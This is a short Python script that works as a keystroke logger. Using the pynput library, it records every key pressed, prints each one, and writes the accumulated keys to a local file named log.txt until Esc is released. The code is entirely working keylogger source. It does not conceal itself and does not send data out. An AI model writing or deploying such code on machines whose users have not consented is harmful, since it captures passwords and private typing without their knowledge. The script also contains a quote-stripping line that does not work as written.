import pynput
from pynput.keyboard import Key, Listener

keys = []
def on_press(key):
  keys.append(key)
  on_write(keys)
  try:
    print("Alpha numeric charachter {0} pressed".format(key.char))
  except:
    print("Special charachter {0} pressed".format(key))

def on_write(keys):
  with open("log.txt", 'w') as f:
    for key in keys:
      k = str(key).replace(" ' ", "")
      f.write(k)
      f.write(" ")

def on_release(key):
  print("{0} key pressed".format(key))
  if key == Key.esc:
    print("SYSTEM EXIT")
    return False

with Listener(on_press=on_press, on_release=on_release) as listener:
  listener.join()
